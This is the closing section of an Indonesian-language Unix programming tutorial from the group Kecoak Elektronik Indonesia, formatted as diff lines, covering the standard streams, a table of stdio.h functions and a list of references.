+--5.3.1-- Pendahuluan
+			
+Dalam library standard, terdapat beberapa fungsi dasar untuk melakukan 
+proses input output. Beberapa fungsi standard tersebut ada dalam header
+stdio.h seperti fopen() atau fseek(), sebagaimana yang telah terdefinisi
+di dalam ISO C standard. 
+		
+--5.3.2-- Standard Input, Output dan Error
+			
+Dalam header stdio.h terdapat 3 streams yang telah terdefinisi secara
+otomatis ketika sebuah prosess dijalankan: standard input, standard output 
+dan standard error. Ketiga streams tersebut sama dengan makro seperti STDIN_
+FILENO, STDOUT_FILENO dan STDERR_FILENO yang ada pada header stdio.h:
+			
+#include <stdio.h>
+
+	FILE *stdin;
+	FILE *stdout;
+	FILE *stderr;
+			
+Dalam file header stdio.h, hampir semua fungsi standard dari I/O tersedia,
+beberapanya seperti:
+			
+	Function       Description
+	 --------		-----------
+	 asprintf       formatted output conversion
+	 clearerr       check and reset stream status
+	 fclose         close a stream
+	 fdopen         stream open functions
+	 feof           check and reset stream status
+	 ferror         check and reset stream status
+	 fflush         flush a stream
+	 fgetc          get next character or word from input stream
+	 fgetln         get a line from a stream
+	 fgetpos        reposition a stream
+	 fgets          get a line from a stream
+	 fgetwc         get next wide character from input stream
+	 fgetws         get a line of wide characters from a stream
+	 fileno         check and reset stream status
+	 fopen          stream open functions
+	 fprintf        formatted output conversion
+	 fpurge         flush a stream
+	 fputc          output a character or word to a stream
+	 fputs          output a line to a stream
+	 fputwc         output a wide character to a stream
+	 fputws         output a line of wide characters to a stream
+	 fread          binary stream input/output
+	 freopen        stream open functions
+	 fropen         open a stream
+	 fscanf         input format conversion
+	 fseek          reposition a stream
+	 fsetpos        reposition a stream
+	 ftell          reposition a stream
+	 funopen        open a stream
+	 fwide          set/get orientation of stream
+	 fwopen         open a stream
+	 fwprintf       formatted wide character output conversion
+	 fwrite         binary stream input/output
+	 getc           get next character or word from input stream
+	 getchar        get next character or word from input stream
+	 gets           get a line from a stream
+	 getw           get next character or word from input stream
+	 getwc          get next wide character from input stream
+	 getwchar       get next wide character from input stream
+	 mkdtemp        create unique temporary directory
+	 mkstemp        create unique temporary file
+	 mktemp         create unique temporary file
+	 perror         system error messages
+	 printf         formatted output conversion
+	 putc           output a character or word to a stream
+	 putchar        output a character or word to a stream
+	 puts           output a line to a stream
+	 putw           output a character or word to a stream
+	 putwc          output a wide character to a stream
+	 putwchar       output a wide character to a stream
+	 remove         remove directory entry
+	 rewind         reposition a stream
+	 scanf          input format conversion
+	 setbuf         stream buffering operations
+	 setbuffer      stream buffering operations
+	 setlinebuf     stream buffering operations
+	 setvbuf        stream buffering operations
+	 snprintf       formatted output conversion
+	 sprintf        formatted output conversion
+	 sscanf         input format conversion
+	 strerror       system error messages
+	 swprintf       formatted wide character output conversion
+	 sys_errlist    system error messages
+	 sys_nerr       system error messages
+	 tempnam        temporary file routines
+	 tmpfile        temporary file routines
+	 tmpnam         temporary file routines
+	 ungetc         un-get character from input stream
+	 ungetwc        un-get wide character from input stream
+	 vasprintf      formatted output conversion
+	 vfprintf       formatted output conversion
+	 vfscanf        input format conversion
+	 vfwprintf      formatted wide character output conversion
+	 vprintf        formatted output conversion
+	 vscanf         input format conversion
+	 vsnprintf      formatted output conversion
+	 vsprintf       formatted output conversion
+	 vsscanf        input format conversion
+	 vswprintf      formatted wide character output conversion
+	 vwprintf       formatted wide character output conversion
+	 wprintf        formatted wide character output conversion
+			 
+Silahkan baca manual dari stdio di manualnya jika ingin melihat daftar 
+lengkapnya, atau lihat header dari stdio.h ketika ingin megetahui parameter 
+yang ada di dalam fungsi-fungsi tersebut. Saya rasa tidak perlu lagi membuat 
+contoh penggunaan dari fungsi I/O yang ada di header stdio.h, karena saya
+yakin anda sudah pernah membuatnya.
+
+--[6]-- Penutup
+
+Pengantar I/O programming diatas sangatlah jauh dari lengkap. Anda harus benar-
+benar memahami konsep dasar dari System I/O itu sendiri seperti I/O Streams, I/O
+Multiplexing, dan lain sebagainya untuk dapat memahamin I/O system. Contoh dari 
+code diatas dibuat sesederhana mungkin untuk memberi gambaran bagi para pemula 
+dalam dunia unix programming. Mudah-mudahan pemahaman dasar ini bisa membuka 
+sedikit mata para kiddie agar bisa (dan mau) melihat source code dari sekian 
+banyak toolz yang dipakai tanpa tahu cara kerjanya.
+		
+~We are watching, and still invisible!
+		
+
+--[7]-- Daftar Pustaka
+
+	[+]	http://en.wikipedia.org
+	[+] 	http://www.opengroup.org/onlinepubs/000095399/
+	[+]	http://www.gnu.org/software/hello/manual/libc/index.html
+	[+]	Unix Manual
+	
+	
+-----------------------------------------------------------------------
+Copyleft Unreserved by Law 1995 - 2009 Kecoak Elektronik Indonesia
+http://www.kecoak-elektronik.net	
